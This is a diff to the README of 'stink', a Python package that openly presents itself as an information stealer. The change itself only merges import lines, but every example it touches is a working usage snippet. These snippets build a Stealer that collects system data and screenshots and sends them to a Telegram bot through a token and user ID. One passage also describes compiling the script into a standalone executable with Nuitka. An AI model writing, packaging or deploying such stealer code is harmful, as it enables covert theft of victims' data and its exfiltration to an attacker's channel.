@@ -53,8 +53,7 @@ The `stink` already has an impressive functionality that will only expand.
 ## Example usage
 ### Standard
 ```python
-from stink import Stealer
-from stink.enums import Senders
+from stink import Stealer, Senders
 
 if __name__ == '__main__':
     Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
@@ -63,8 +62,7 @@ if __name__ == '__main__':
 
 An example with only system data collection and screenshot.
 ```python
-from stink import Stealer
-from stink.enums import Features, Senders
+from stink import Stealer, Features, Senders
 
 if __name__ == '__main__':
     Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
@@ -127,8 +125,7 @@ We will need Nuitka to do this.
 2. Unpack the archive and go to the directory stink-master.
 3. Create test.py (or any other name) file in the same directory with the following code:
 ```python
-from stink import Stealer
-from stink.enums import Senders
+from stink import Stealer, Senders
 
 if __name__ == '__main__':
     Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
